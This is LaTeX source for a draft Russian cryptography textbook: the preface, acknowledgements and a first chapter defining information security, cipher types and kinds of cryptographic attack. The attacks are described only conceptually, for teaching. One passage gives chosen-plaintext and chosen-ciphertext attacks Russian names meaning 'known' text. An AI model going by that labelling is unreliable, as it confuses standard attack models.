\input{_settings}
\addbibresource{bibliography.bib}

\title{Криптографические методы \\ защиты информации \\ \bigskip \normalsize{Учебное пособие}}
\author{Владимиров Сергей Михайлович \\ Габидулин Эрнст Мухамедович \\ Колыбельников Александр Иванович \\ Кшевецкий Александр Сергеевич}
\date{\bigskip \bigskip \bigskip \bigskip \bigskip \today \bigskip \\ \small{черновой вариант третьего издания}}

\begin{document}
\selectlanguage{russian}

\maketitle
\setcounter{page}{3}

\newpage
%\thispagestyle{empty}
\setcounter{tocdepth}{2}
\tableofcontents
%\thispagestyle{empty}
\newpage

%\lhead[\leftmark]{}
%\rhead[]{\rightmark}

\chapter*{Предисловие}
\addcontentsline{toc}{chapter}{Предисловие}
\markboth{ПРЕДИСЛОВИЕ}{ПРЕДИСЛОВИЕ}
\selectlanguage{russian}

В настоящем пособии рассмотрены только основные математические методы защиты информации, и среди них основной акцент сделан на криптографическую защиту, которая включает симметричные и несимметричные методы шифрования, формирование секретных ключей, протоколы ограничения доступа и аутентификации сообщений и пользователей. Кроме того, в пособии рассматриваются типовые уязвимости операционных и информационно-вычислительных систем.

\section*{Благодарности}
\addcontentsline{toc}{section}{Благодарности}
Авторы пособия благодарят студентов, аспирантов и сотрудников института, которые помогли с подготовкой, редактированием и поиском ошибок в тексте.

\begin{multicols}{2}
\begin{small}
\begin{itemize}\itemsep 1pt \parskip 0pt \parsep 0pt
	\item[] Татьяна Бакланова\begin{tiny} (201-211 гр.)\end{tiny}
	\item[] Дмитрий Банков\begin{tiny} (201-011 гр.)\end{tiny}
	\item[] Даниил Бершацкий\begin{tiny} (201-012 гр.)\end{tiny}
	\item[] Дмитрий Бородий\begin{tiny} (201-112 гр.)\end{tiny}
	\item[] Илья Васильев\begin{tiny} (201-217 гр.)\end{tiny}
	\item[] Эмиль Вахитов\begin{tiny} (201-114 гр.)\end{tiny}
	\item[] Дмитрий Вербицкий\begin{tiny} (201-119 гр.)\end{tiny}
	\item[] Тагир Гадельшин\begin{tiny} (201-119 гр.)\end{tiny}
	\item[] Марат Гаджибутаев\begin{tiny} (201-018 гр.)\end{tiny}
	\item[] Ильназ Гараев\begin{tiny} (201-113 гр.)\end{tiny}
	\item[] Евгений Глушков\begin{tiny} (201-012 гр.)\end{tiny}
	\item[] Андрей Горбунов\begin{tiny} (201-116 гр.)\end{tiny}
	\item[] Алексей Гусаров\begin{tiny} (201-216 гр.)\end{tiny}
	\item[] Наталья Гусева\begin{tiny} (201-216 гр.)\end{tiny}
	\item[] Сергей Жестков\begin{tiny} (201-013 гр.)\end{tiny}
	\item[] Виталий Занкин\begin{tiny} (201-111 гр.)\end{tiny}
	\item[] Дмитрий Зборовский\begin{tiny} (201-119 гр.)\end{tiny}
	\item[] Марат Ибрагимов\begin{tiny} (201-114 гр.)\end{tiny}
	\item[] Александр Иванов\begin{tiny} (201-011 гр.)\end{tiny}
	\item[] Александр Иванов\begin{tiny} (201-019 гр.)\end{tiny}
	\item[] Атнер Иванов\begin{tiny} (201-114 гр.)\end{tiny}
	\item[] Владимир Ивашкин\begin{tiny} (201-112 гр.)\end{tiny}
	\item[] Ирина Камалова\begin{tiny} (201-115 гр.)\end{tiny}
	\item[] Иван Киселёв\begin{tiny} (201-115 гр.)\end{tiny}
	\item[] Константин Ковальков\begin{tiny} (201-015 гр.)\end{tiny}
	\item[] Андрей Кочетыгов\begin{tiny} (201-111 гр.)\end{tiny}
	\item[] Александр Кравцов\begin{tiny} (201-116 гр.)\end{tiny}
	\item[] Виталий Крепак\begin{tiny} (201-013 гр.)\end{tiny}
	\item[] Александр Кротов\begin{tiny} (201-011 гр.)\end{tiny}
	\item[] Станислав Круглик\begin{tiny} (201-111 гр.)\end{tiny}
	\item[] Егор Кузнецов\begin{tiny} (201-211 гр.)\end{tiny}
	\item[] Зулкаид Курбанов\begin{tiny} (201-113 гр.)\end{tiny}
	\item[] Всеволод Ливинский\begin{tiny} (201-216 гр.)\end{tiny}
	\item[] Егор Макарычев\begin{tiny} (201-115 гр.)\end{tiny}
	\item[] Ольга Малюгина\begin{tiny} (201-111 гр.)\end{tiny}
	\item[] Алексей Мамаков\begin{tiny} (201-113 гр.)\end{tiny}
	\item[] Роман Маракулин\begin{tiny} (201-211 гр.)\end{tiny}
	\item[] Артём Меринов\begin{tiny} (201-214 гр.)\end{tiny}
	\item[] Даниил Меркулов\begin{tiny} (201-111 гр.)\end{tiny}
	\item[] Олег Милосердов\begin{tiny} (201-016 гр.)\end{tiny}
	\item[] Дао Куанг Минь\begin{tiny} (201-116 гр.)\end{tiny}
	\item[] Антон Митрохин\begin{tiny} (201-216 гр.)\end{tiny}
	\item[] Надежда Мозолина\begin{tiny} (201-119 гр.)\end{tiny}
	\item[] Хыу Чунг Нгуен\begin{tiny} (201-015 гр.)\end{tiny}
	\item[] Артём Никитин\begin{tiny} (201-012 гр.)\end{tiny}
	\item[] Евгения Никольская\begin{tiny} (201-115 гр.)\end{tiny}
	\item[] Андрей Пунь\begin{tiny} (201-013 гр.)\end{tiny}
	\item[] Вадим Сафронов\begin{tiny} (201-112 гр.)\end{tiny}
	\item[] Иван Саюшев\begin{tiny} (201-112 гр.)\end{tiny}
	\item[] Илья Соломатин\begin{tiny} (201-211 гр.)\end{tiny}
	\item[] Игорь Сорокин\begin{tiny} (201-112 гр.)\end{tiny}
	\item[] Игорь Степанов\begin{tiny} (201-213 гр.)\end{tiny}
	\item[] Виктор Сухарев\begin{tiny} (201-114 гр.)\end{tiny}
	\item[] Буй Зуи Тан\begin{tiny} (201-112 гр.)\end{tiny}
	\item[] Татьяна Тюпина\begin{tiny} (201-116 гр.)\end{tiny}
	\item[] Сергей Угрюмов\begin{tiny} (201-119 гр.)\end{tiny}
	\item[] Марсель Файзуллин\begin{tiny} (201-114 гр.)\end{tiny}
	\item[] Нияз Фазлыев\begin{tiny} (201-114 гр.)\end{tiny}
	\item[] Наталья Федотова\begin{tiny} (201-212 гр.)\end{tiny}
	\item[] Данил Филиппов\begin{tiny} (201-115 гр.)\end{tiny}
	\item[] Александра Цветкова\begin{tiny} (201-216 гр.)\end{tiny}
	\item[] Евгений Юлюгин\begin{tiny} (201-916 гр.)\end{tiny}
	\item[] Руслан Юсупов\begin{tiny} (201-211 гр.)\end{tiny}
\end{itemize}
\end{small}
\end{multicols}


\subimport*{history/}{index}

\chapter{Основные понятия и определения}
\selectlanguage{russian}

Изучение курса <<Защита информации>> необходимо начать с определения понятия \emph{<<информация>>}. В теоретической информатике \emph{информация} -- это любые сведения, или цифровые данные, или сообщения, или документы, или файлы, которые могут быть переданы \emph{получателю информации} от \emph{источника информации}. Можно считать, что информация передаётся по какому-либо каналу связи с помощью некоторого носителя, которым может быть, например, распечатка текста, диск или другое устройство хранения информации, система передачи сигналов по оптическим, проводным линиям или радиолиниям связи и~т.\,д.

\emph{Защита информации} -- это\footnote{Строго говоря, определение защиты информации даётся в официальном стандарте ГОСТ Р 50922-2006, <<Защита информации. Основные термины и определения>>~\cite{GOST-50922-2006}, согласно которому \emph{защита информации} -- это деятельность, направленная на предотвращение утечки защищаемой информации, несанкционированных и непреднамеренных воздействий на защищаемую информацию. Однако мы пользуемся определением, основанным на понятии <<безопасность информации>> из того же стандарта: \emph{безопасность информации} -- это состояние защищенности информации, при котором обеспечиваются ее \emph{конфиденциальность}, \emph{доступность} и \emph{целостность}.} обеспечение \emph{целостности}, \emph{конфиденциальности} и \emph{доступности} информации, передаваемой или хранимой в какой-либо форме. Информацию необходимо защищать от нарушения её целостности и конфиденциальности в результате вмешательства \emph{нелегального пользователя}. В российском стандарте ГОСТ Р 50.1.056-2005 приведены следующие определения~\cite{GOST-2005}:
\begin{itemize}
	\item \emph{целостность информации}\index{целостность} -- состояние информации, при котором отсутствует любое ее изменение либо изменение осуществляется только преднамеренно субъектами, имеющими на него право;
	\item \emph{конфиденциальность}\index{конфиденциальность} -- состояние информации, при котором доступ к ней осуществляют только субъекты, имеющие на него право;
	\item \emph{доступность}\index{доступность} -- состояние информации, при котором субъекты, имеющие права доступа, могут реализовать их беспрепятственно.
\end{itemize}

Другой стандарт ГОСТ Р ИСО/МЭК 13335-1-2006~\cite{GOST-13335-1-2006} определяет \emph{информационную безопасность} как все аспекты, связанные с определением, достижением и поддержанием \emph{конфиденциальности}, \emph{целостности}, \emph{доступности}, \emph{неотказуемости}, \emph{подотчетности}, \emph{аутентичности} и \emph{достоверности} информации или средств ее обработки. То есть в дополнение к предыдущему определению на защиту информации в области информационных технологий возлагаются дополнительные задачи:
\begin{itemize}
	\item обеспечение \emph{неотказуемости} -- способности удостоверять имевшее место действие или событие так, чтобы эти события или действия не могли быть позже отвергнуты;
	\item обеспечение \emph{подотчетности} -- способности однозначно прослеживать действия любого логического объекта;
	\item обеспечение \emph{аутентичности} -- способности гарантировать, что субъект или ресурс идентичны заявленным;\footnote{Аутентичность применяется к таким субъектам, как пользователи, к процессам, системам и информации.}
	\item обеспечение \emph{достоверности} -- способности обеспечивать соответствие предусмотренному поведению и результатам;
\end{itemize}

Стандарт ГОСТ Р 50922-2006~\cite{GOST-50922-2006}, хотя и не вводит прямой классификации методов защиты информации, даёт следующие их определения.
\begin{itemize}
	\item \emph{Правовая защита информации}. Защита информации правовыми методами, включающая в себя разработку законодательных и нормативных правовых документов (актов), регулирующих отношения субъектов по защите информации, применение этих документов (актов), а также надзор и контроль за их исполнением.
	\item \emph{Техническая защита информации; ТЗИ}. Защита информации, заключающаяся в обеспечении некриптографическими методами безопасности информации (данных), подлежащей (подлежащих) защите в соответствии с действующим законодательством, с применением технических, программных и программно-технических средств.
	\item \emph{Криптографическая защита информации}. Защита информации с помощью ее криптографического преобразования.
	\item \emph{Физическая защита информации}. Защита информации путем применения организационных мероприятий и совокупности средств, создающих препятствия для проникновения или доступа неуполномоченных физических лиц к объекту защиты.
\end{itemize}

В рамках данного пособия в основном остановимся на криптографических методах защиты информации. Они помогают обеспечить \emph{конфиденциальность} и \emph{аутентичность}. В сочетании с правовыми методами зашиты информации они помогают обеспечить \emph{неотказуемость} действий, а в сочетании с техническими -- \emph{целостность информации} и \emph{достоверность}.

При изучении криптографических методов защиты информации используются дополнительные определения. В целом науку о создании, анализе и использовании криптографических методов называют \emph{криптогологией}. Её разделяют на \emph{криптографию}, посвящённую разработке и применению криптографических методов, и \emph{криптоанализ}, который занимается поиском уязвимостей в существующих методах. Данное разделение на криптографию и криптоанализ (и, соответственно, разделение на \emph{криптографов} и \emph{криптоаналитиков}) условно, так как создать хороший криптографический метод невозможно без умения анализировать его потенциальные уязвимости, а поиск уязвимостей в современных криптографических методах нельзя осуществить без знания методов их построения.

Попытка криптоаналитика нарушить свойство криптографической системы по обеспечению защиты информации (например, получить информацию вопреки свойству обеспечения конфиденциальности) называется \emph{криптографической атакой} (\emph{криптоатакой}). Если данная попытка оказалась успешной, и свойство было нарушено или может быть нарушено в ближайшем будущем, то такое событие называется \emph{взломом криптосистемы} или \emph{вскрытием криптосистемы}. Конкретный метод криптографической атаки также называется \emph{криптоанализ} (например, линейный криптоанализ, дифференциальный криптоанализ, и~т.~д.). Криптосистема называется \emph{криптостойкой}, если число стандартных операций для её взлома превышает возможности современных вычислительных средств в течение всего времени ценности информации (до 100 лет).

Для многих криптографических примитивов существует атака полным перебором\index{атака!полным перебором}, либо аналогичная, которая подразумевает, что если выполнить очень большое количество определённых операций (по одной на каждое значение из области определения одного из аргументов криптографического метода), то один из результатов укажет непосредственно на способ взлома системы (например, укажет на ключ для нарушения конфиденциальности, обеспечиваемой алгоритмом шифрования, или на допустимый прообраз для функции хеширования, приводящий к нарушению аутентичности и целостности). В этом случае под \emph{взломом криптосистемы} понимается построение алгоритма криптоатаки с количеством операций меньшим, чем планировалось при создании этой криптосистемы (часто, но не всегда, это равно именно количеству операций при атаке полным перебором\footnote{Например, сложность построения второго прообраза для хеш-функций на основе конструкции Меркла~---~Дамгарда составляет $2^n / \left|M\right|$ операций, тогда как полный перебор -- $2^n$. См. раздел~\ref{section-stribog}}). Взлом криптосистемы – это не обязательно, например, реально осуществленное извлечение информации, так как количество операций может быть вычислительно недостижимым как в настоящее время, так и в течение всего времени защиты. То есть могут существовать системы, которые формально взломаны, но пока ещё являются криптостойкими.

Далее рассмотрим модель передачи информации с отдельными криптографическими методами.

% !TeX spellcheck = en_US
\section{Модель системы передачи с криптозащитой}

Простая модель системы передачи с криптозащитой представлена на рис. \ref{pic:Encrypt}, где введены следующие обозначения:
\begin{itemize}
    \item $A$ -- источник информации;
    \item $B$ -- получатель информации, легальный пользователь;
    \item $X$ -- сообщение до шифрования или \textbf{открытый текст}\index{открытый текст} (plaintext); $\set{M}$ -- множество всех возможных открытых текстов (от слова Message), $X \in \set{M}$;
    \item $K_1$ -- ключ шифрования\index{ключ!шифрования}; $\set{K}_E$ -- множество всех возможных ключей шифрования  (от слов Key и Encryption), $K_1 \in \set{K}_E$;
    \item $Y$ -- шифрованное  сообщение (или \textbf{шифротекст}\index{шифротекст}, или \textbf{шифрограмма}\index{шифрограмма}); $\set{C}$ -- множество всех возможных шифротекстов (от термина Cipher text), $Y \in \set{C}$;
    \item $K_2$ -- ключ расшифрования\index{ключ!расшифрования}; $\set{K}_D$  -- множество возможных ключей расшифрования  (от слов Key и Decryption),  зависящее от множества $\set{K}_E$, $K_2 \in \set{K}_D$.
\end{itemize}

\begin{figure}[h!]
	\centering
	\includegraphics[width=1.0\textwidth]{pic/scheme-of-cipher}
	\caption{Передача информации с криптозащитой\label{pic:Encrypt}}
\end{figure}

\textbf{Шифр}\index{шифр} -- это множество обратимых функций отображения $E_{K_1}$\index{функция!шифрования} множества открытых текстов $\set{M}$ на множество шифротекстов $\set{C}$, зависящих от выбранного ключа шифрования $K_1$ из множества $\set{K}_E$:
%обратимое отображение пары из элемента множества открытых текстов $\set{M}$ и элемента множества ключей шифрования $\set{K}_E$ в множество шифротекстов $\set{C}$:
\begin{equation}
    \label{eq:Encryption}
    Y = E_{K_1}(X), ~ X \in \set{M}, ~ K_1 \in \set{K}_E, ~ Y \in \set{C}.
\end{equation}
Можно сказать, что шифрование -- это обратимая функция двух аргументов: сообщения и ключа. Для каждого $K_1$ эта функция должна быть обратимой.  Обратимость -- основное условие шифрования, по которому каждому зашифрованному сообщению $Y$ и ключу $K$ соответствует одно исходное сообщение $X$. Легальный пользователь $B$ (на приемной стороне системы связи)  получает сообщение $Y$ и осуществляет процедуру \textbf{расшифрования}\index{расшифрование}.
Следует отличать шифрование от кодирования, кодирование это процесс сопоставления конкретным сообщениям строго определенной комбинации символов или сигналов, с целью повышения помехоустойчивости передаваемого сигнала.
Расшифрование --  это отображение множества шифротекстов $\set{C}$ в множество открытых текстов $\set{M}$ функцией $D_{K_2}$\index{функция!расшифрования}, зависящей от ключа расшифрования $K_2$ из множества $\set{K}_D$, являющейся обратной к функции $E_{K_1}$.
\begin{equation}
    \label{eq:Decryption}
    D_{K_2}(Y) = X, ~ Y \in \set{C}, ~ K_2 \in \set{K}_D, ~ X \in \set{M}.
\end{equation}

%Система передачи информации с криптозащитой называется \textbf{криптосистемой}\index{криптосистема}.(?????)

%В общем случае функция шифрования сюръективна и псевдослучайна, отображая один открытый текст в разные шифротексты. Если функция шифрования биективна, на практике ее инкапсулируют в другую функцию с целью добиться псевдослучайности шифрования одинаковых открытых текстов в разные шифротексты.

%Методы защиты информации зависят от возможных сценариев передачи. Рассмотрим несколько основных вариантов.
Рассмотрим  возможные сценарии вмешательства криптоаналитика и организации защиты информации от его действий.
Пусть  $A$ --  источник и $B$ -- получатель сообщений.

\begin{description}
    \item[Сценарий 1.] Пусть $E$ -- \textbf{пассивный} криптоаналитик\index{криптоаналитик!пассивный}, который может подслушивать передачу, но не может вмешиваться в процесс передачи. Из пассивности криптоаналитика следует,  что $Y = \widetilde{Y}$ и \textbf{целостность} информации обеспечена.

Цель защиты --- \textbf{обеспечение конфиденциальности}.

Средства защиты -- шифрование с помощью \emph{симметричных} или \emph{асимметричных } криптосистем.

Дополнительные задачи -- при большом числе пользователей должна быть решена задача \textbf{генерации и доставки секретных ключей} всем пользователям.

    \item[Сценарий 2.] Пусть $E$ -- \textbf{активный} криптоаналитик\index{криптоаналитик!активный}, который может изменять, удалять и вставлять сообщения или их части.

    Цель защиты -- \textbf{обеспечение конфиденциальности} и  \textbf{обеспечение целостности}.

Средства защиты --  шифрование и добавление \emph{кода аутентификации сообщения} (Message Authentication Code -- $\MAC$), позволяющего обнаружить нарушение целостности.

    \item[Сценарий 3.] Пусть $E$ -- активный криптоаналитик, который может изменять, удалять и вставлять сообщения или их части), дополнительно к этому легальные пользователи $A$ и $B$ не доверяют друг  другу.

Цель защиты -- \textbf{аутентификация }пользователей и документов.

Средства -- \emph{электронная  цифровая подпись} и протокол идентификации (аутентификации) пользователей.
\end{description}

%%Возможно вмешательство нелегального пользователя $E$, называемого \textbf{криптоаналитиком}.
%%
%%
%%Если $X = \widetilde{X}$, то вмешательство криптоаналитика  $E$ не изменило передаваемое сообщение, и \textbf{целостность} информации обеспечена. Если криптоаналитик не получил информацию, содержащуюся в сообщении, то обеспечена \textbf{конфиденциальность}.
%%
%%Если в этой системе возможна двусторонняя передача, то есть от $A$ к $B$ и от $B$ к $A$, то говорят о взаимном обмене информацией между легальными пользователями.
%
%Секретность информации в современных шифрах обеспечивается секретным ключом, в то время как сам алгоритм криптосистемы является общеизвестным. Исторический опыт, например, система шифрования A5/1 в GSM, показывает, что секретность алгоритма шифрования \emph{ослабляет} криптостойкость шифра, а не увеличивает, из-за того, что система становится малоизученной.


\section{Классификация криптографических механизмов}

\subsection{Симметричные и асимметричные криптосистемы}
\selectlanguage{russian}

Криптографические системы и шифры можно разделить на две большие группы в зависимости от принципа использования ключей для шифрования и расшифрования.

Если для шифрования и расшифрования используется один и тот же ключ $K$ либо если получение ключа расшифрования $K_2$ из ключа шифрования $K_1$ является тривиальной операцией, то такая криптосистема называется \emph{симметричной}\index{криптосистема!симметричная}. В зависимости от объёма данных, обрабатываемых за одну операцию шифрования, симметричные шифры делятся на \emph{блочные}\index{шифр!блочный}, в которых за одну операцию шифрования происходит преобразование одного блока данных (32 бита, 64, 128 или больше), и \emph{потоковые}\index{шифр!потоковый}, в которых работают с каждым символом открытого текста по отдельности (например, с 1 битом или 1 байтом). Примеры блочных шифров рассмотрены в главе~\ref{chapter-block-ciphers}, а потоковых -- в главе~\ref{chapter-stream-ciphers}.

Использование блочного шифра подразумевает разделение открытого текста на блоки одинаковой длины, к каждому из которых применяется функция шифрования, причём результат шифрования следующего блока может зависеть от предыдущего\footnote{Строго говоря, функция шифрования может применяться не только к самому блоку данных, но и к другим параметрам текущего отрывка открытого текста. Например, к его позиции в тексте (\langen{offset}), либо даже к результату шифрования предыдущего блока.}. Это регулируется \emph{режимом работы блочного шифра}. Примеры нескольких таких режимов рассмотрены в разделе~\ref{section-block-chaining}.

Если ключ расшифрования получить из ключа шифрования вычислительно сложно, то такие криптосистемы называют криптосистемами \emph{с открытым ключом}\index{криптосистема!с открытым ключом} или \emph{асимметричными} криптосистемами\index{криптосистема!асимметричная}. Некоторые из них рассмотрены в главе~\ref{chapter-public-key}. Все используемые на сегодняшний день асимметричные криптосистемы работают с открытым текстом, составляющим несколько сотен или тысяч бит, поэтому классификация таких систем по объёму обрабатываемых за одну операцию данных не производится.

Алгоритм, который выполняет отображение аргумента произвольной длины в значение фиксированной длины, называется \emph{хэш-функцией}. Если для такой хэш-функции выполняются определённые свойства, например, устойчивости к поиску коллизий, то это уже \emph{криптографическая хэш-функция}. Такие функции рассмотрены в главе~\ref{chapter-hash-functions}.

Для проверки аутентичности сообщения с использованием общего секретного ключа отправителя и получателя используется \emph{код аутентификации [сообщения]} (\emph{имитовставка}, \langen{message authentication code, MAC}), рассмотренный в разделе~\ref{section-MAC}. Его аналогом в криптосистемах с открытым ключом является \emph{электронная подпись}, алгоритмы генерации и проверки которой рассмотрены в главе~\ref{chapter-public-key} вместе с алгоритмами асимметричного шифрования.

\subsection{Шифры замены и перестановки}

Шифры по способу преобразования открытого текста в шифротекст разделяются на шифры замены и шифры перестановки.

\subsubsection{Шифры замены}
\selectlanguage{russian}

В шифрах \textbf{замены} символы одного алфавита заменяются символами другого алфавита обратимым преобразованием. В последовательности открытого текста символы входного алфавита заменяются на символы выходного алфавита. Такие шифры применяются как в симметричных, так и в асимметричных криптосистемах. Если при преобразовании используются однозначные функции, то шифры замены называются \textbf{однозначными} шифрами замены. Если используются многозначные функции, то шифры называются \textbf{многозначными} шифрами замены (омофонами).

В \textbf{омофоне}\index{омофон} символам входного алфавита ставятся в соответствие непересекающиеся подмножества символов выходного алфавита. Количество символов в каждом подмножестве замены пропорционально частоте встречаемости символа открытого текста. Таким образом, омофон создаёт равномерное распределение символов шифротекста, и прямой частотный криптоанализ невозможен. При шифровании омофонами символ входного алфавита заменяется на случайно выбранный из подмножества замены.

Шифры бывают \textbf{моноалфавитные}, когда для шифрования используется одно отображение входного алфавита в выходной алфавит. Если алфавит на входе и выходе одинаков, и его размер (число символов) равен $D$, тогда количество всевозможных моноалфавитных шифров замены такого типа равно $D!$.

\textbf{Полиалфавитный} шифр задаётся множеством различных вариантов отображения входного алфавита на выходной алфавит. Шифры замены могут быть как потоковыми, так и блочными. Однозначный полиалфавитный потоковый шифр замены называется \textbf{шифром гаммирования}\index{шифр!гаммирования}. Символом алфавита может быть, например, 256-битовое слово, а размер алфавита~--- $2^{256}$ соответственно.


\subsubsection{Шифры перестановки}
\selectlanguage{russian}

Шифры \textbf{перестановки} реализуются следующим образом. Берётся открытый текст, например буквенный, и разделяется на блоки определённой длины $x_1, x_2, \dots, x_m$. Затем осуществляется перестановка позиций блока (вместе с символами). Перестановки могут быть однократные и многократные. Частный случай перестановки ~--- сдвиг. Приведём пример:
\begin{center}
    секрет $\xrightarrow{\text{сдвиг}}$ ретсек $\xrightarrow{\text{перестановка}}$ рскете.
\end{center}
Ключ такого шифра указывает изменение порядка номеров позиций блока при шифровании и расшифровании.

Существуют так называемые \textbf{маршрутные перестановки}. Используется какая-либо геометрическая фигура, например прямоугольник. Запись открытого текста ведётся по одному \emph{маршруту}, например по строкам, а считывание для шифрования осуществляется по другому маршруту, например по столбцам. Ключ шифра определяет эти маршруты.
В случае, когда рассматривается перестановка блока текста фиксированной длины, перестановку можно рассматривать как замену.

В полиалфавитных шифрах при шифровании открытый текст разбивается на блоки (последовательности) длины $n$, где $n$ ~--- \textbf{период}. Этот параметр выбирает \emph{криптограф} и держит его в секрете.

Поясним процедуру шифрования полиалфавитным шифром. Запишем шифруемое сообщение в матрицу по столбцам определённой длины. Пусть открытый текст таков: <<Игры различаются по содержанию, характерным особенностям, а также по тому, какое место они занимают в жизни детей>>. Зададим $n=4$ и запишем этот текст в матрицу размера $(4 \times 24)$:

\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|*{24}{c|}}
    \hline
    и&р&и&т&о&е&н&а&т&ы&о&н&я&а&п&м&к&е&о&а&а&ж&и&е \\
    г&а&ч&с&с&р&и&р&е&м&б&о&м&к&о&у&о&с&н&н&ю&и&д&й \\
    р&з&а&я&о&ж&ю&а&р&о&е&с&а&ж&т&к&е&т&и&и&т&з&е& \\
    ы&л&ю&п&д&а&х&к&н&с&н&т&т&е&о&а&м&о&з&м&в&н&т& \\
    \hline
\end{tabular} } \end{center}

Выбираем $4$ различных моноалфавитных шифра.

Первую строку

\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|*{24}{c|}}
    \hline
    и&р&и&т&о&е&н&а&т&ы&о&н&я&а&п&м&к&е&о&а&а&ж&и&е \\
    \hline
\end{tabular} } \end{center}

шифруем, используя первый шифр. Вторую строку

\begin{center} \resizebox{\textwidth}{!}{ \begin{tabular}{|*{24}{c|}}
    \hline
    г&а&ч&с&с&р&и&р&е&м&б&о&м&к&о&у&о&с&н&н&ю&и&д&й \\
    \hline
\end{tabular} } \end{center}

шифруем, используя второй шифр, и т.~д.

Выполняя расшифрование, легальный пользователь знает период. Он записывает принятую шифрограмму по строкам в матрицу с длиной строки, равной периоду, к каждому столбцу применяет соответствующий ключ и расшифровывает сообщение, зная соответствующие шифры.

Шифры перестановки можно рассматривать как частный случай шифров замены, если отождествить один блок перестановки с одним символом большого алфавита.


\subsubsection{Композиционные шифры}
\selectlanguage{russian}

Почти все современные шифры являются \textbf{композиционными}~\cite{AlZKCh:2001}. В них применяются несколько различных методов шифрования к одному и тому же открытому тексту. Другое их название~--- \textbf{составные шифры}. Впервые понятие составных шифров было введено в работе Клода Шеннона (\langen{Claude Elwood Shannon}).

В современных криптосистемах шифры замены и перестановок используются многократно, образуя составные (композиционные) шифры.



\subsection{Примеры современных криптографических примитивов}

Приведём примеры названий некоторых современных криптографических примитивов, из которых строят системы защиты информации.
\begin{itemize}
    \item DES\index{шифр!DES}, AES, ГОСТ 28147-89, Blowfish\index{шифр!Blowfish}, RC5\index{шифр!RC5}, RC6\index{шифр!RC6} -- блочные симметричные шифры, скорость обработки -- десятки мегабайт в секунду.
    \item A5/1, A5/2, A5/3\index{шифр!A5}, RC4\index{шифр!RC4} -- потоковые симметричные шифры с высокой скоростью. Семейство A5 применяется в мобильной связи GSM, RC4 -- в компьютерных сетях для SSL-соединения между браузером и веб-сервером.
    \item RSA\index{шифр!RSA} -- криптосистема с открытым ключом для шифрования.
    \item RSA\index{электронная подпись!RSA}, DSA\index{электронная подпись!DSA}, ГОСТ Р 34.10-2001\index{электронная подпись!ГОСТ Р 34.10-2001} -- криптосистемы с открытым ключом для электронной подписи.
    \item MD5\index{хэш-функция!MD5}, SHA-1\index{хэш-функция!SHA-1}, SHA-2\index{хэш-функция!SHA-2}, ГОСТ Р 34.11-94\index{хэш-функция!ГОСТ Р 34.11-94} -- криптографические хэш-функции.
\end{itemize}

\section{Методы криптоанализа и типы атак}
\selectlanguage{russian}

Нелегальный пользователь-криптоаналитик получает информацию путем дешифрования. Сложность этой процедуры определяется числом стандартных операций, которые надо выполнить для достижения цели. \emph{Двоичной сложностью}\index{сложность!двоичная} (или битовой сложностью) алгоритма называется количество двоичных операций, которые необходимо выполнить для его завершения.
% Наиболее сложным является дешифрование полиалфавитных шифров.

Попытка криптоаналитика $E$ получить информацию называется \emph{атакой} или криптоатакой\index{атака}. Как правило, легальным пользователям нужно обеспечить защиту информации на протяжении от нескольких дней до 100 лет. Если попытка атаки оказалась удачной для нелегального пользователя $E$, и информация получена или может быть получена в ближайшем будущем, то такое событие называется  \emph{взломом криптосистемы}\index{взлом криптосистемы} или \emph{вскрытием криптосистемы}. Метод вскрытия криптосистемы называется \emph{криптоанализом}\index{криптоанализ}. Криптосистема называется \emph{криптостойкой}\index{криптостойкость}, если число стандартных операций для ее взлома превышает возможности современных вычислительных средств в течение всего времени ценности информации (до 100 лет).

В общем случае, в криптоанализе под \emph{взломом} криптосистемы понимается построение алгоритма криптоатаки для получения доступа к информации с количеством операций, меньшим, чем планировалось при создании этой криптосистемы. Взлом криптосистемы -- это не обязательно реально осуществленное извлечение информации, так как количество операций для извлечения информации может быть вычислительно недостижимым как в настоящее время, так и в течение всего времени защиты.
%, но предполагается достижимым в будущем.

Рассмотрим основные сценарии работы криптоаналитика $E$. В первом сценарии криптоаналитик может осуществлять подслушивание и (или) перехват сообщений. Его вмешательство не нарушает целостности информации: $Y=\widetilde{Y}$. Эта роль криптоаналитика называется \emph{пассивной}. Так как он получает доступ к информации, то здесь нарушается конфиденциальность.

Во втором сценарии роль криптоаналитика \emph{активная}. Он может подслушивать, перехватывать сообщения и преобразовывать их по своему усмотрению: задерживать, искажать с помощью перестановок пакетов, устраивать обрыв связи, создавать новые сообщения и т.~п. Так что в этом случае выполняется условие $Y \neq \widetilde{Y}$. Это значит, что одновременно нарушается целостность и конфиденциальность передаваемой информации.

Приведём примеры пассивных и активных атак.
\begin{itemize}
    \item Атака <<\emph{человек посередине}>>\index{атака!<<человек посередине>>} (\langen{man-in-the-middle}) подразумевает криптоаналитика, который разрывает канал связи, встраиваясь между $A$ и $B$, получает сообщения от $A$ и от $B$, а от себя отправляет новые, фальсифицированные сообщения. В результате $A$ и $B$ не замечают, что общаются с $E$, а не друг с другом.
    \item Атака \emph{воспроизведения}\index{атака!воспроизведения} (\langen{replay attack}) -- когда криптоаналитик может записывать и в будущем воспроизводить шифротексты, имитируя легального пользователя.
    \item Атака на \emph{различение} сообщений\index{атака!на различение} означает, что криптоаналитик, наблюдая одинаковые шифротексты, может извлечь информацию об идентичности исходных открытых текстов.
    \item Атака на \emph{расширение} сообщений\index{атака!на расширение} означает, что криптоаналитик может дополнить шифротекст осмысленной информацией без знания секретного ключа.
    \item \emph{Фальсификация} шифротекстов\index{атака!фальсификацией} криптоаналитиком без знания секретного ключа.
\end{itemize}

Часто для нахождения секретного ключа криптоатаки строят в предположениях о доступности дополнительной информации. Приведём примеры.
\begin{itemize}
    \item Атака на основе известного открытого текста\index{атака!с известным открытым текстом} (\langen{chosen plaintext attack, CPA}) предполагает возможность криптоаналитику выбирать открытый текст и получать для него соответствующий шифротекст.
    \item Атака на основе известного шифротекста\index{атака!с известным шифротекстом} (\langen{chosen ciphertext attack, CCA}) предполагает, что криптоаналитик имеет возможность выбирать шифротекст и получать для него соответствующий открытый текст.
\end{itemize}

Обязательным требованием к современным криптосистемам является устойчивость ко всем известным типам атак: пассивным, активным и с дополнительной информацией.


%Приведём примеры возможных вариантов работы активного криптоаналитика.
%\begin{itemize}
%\item Криптоаналитик имеет $m$ шифрованных сообщений $Y_{1},Y_{2},\ldots Y_{m}$ и пытается определить ключ или прочитать открытый текст $X_{1},X_{2},\ldots X_{m}.$
%\item Криптоаналитик имеет несколько пар открытого и шифрованного текстов
%
